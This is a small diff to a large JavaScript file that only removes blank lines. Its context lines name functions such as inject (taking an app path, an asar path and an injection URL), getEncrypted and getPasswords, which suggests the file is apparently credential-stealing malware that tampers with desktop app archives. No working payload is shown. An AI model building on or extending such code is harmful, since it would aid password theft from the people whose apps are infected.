@@ -2327,9 +2327,6 @@ async function getEncrypted() {
     }
 }
 
-
-
-
 function addFolder(folderPath) {
   const folderFullPath = path.join(randomPath, folderPath);
   if (!fs.existsSync(folderFullPath)) {
@@ -3499,7 +3496,6 @@ async function inject(appPath, asarPath, injectionUrl, licensePath) {
         console.error('Error during injection:', error);
     }
 }
-
 
 
 async function getPasswords() {
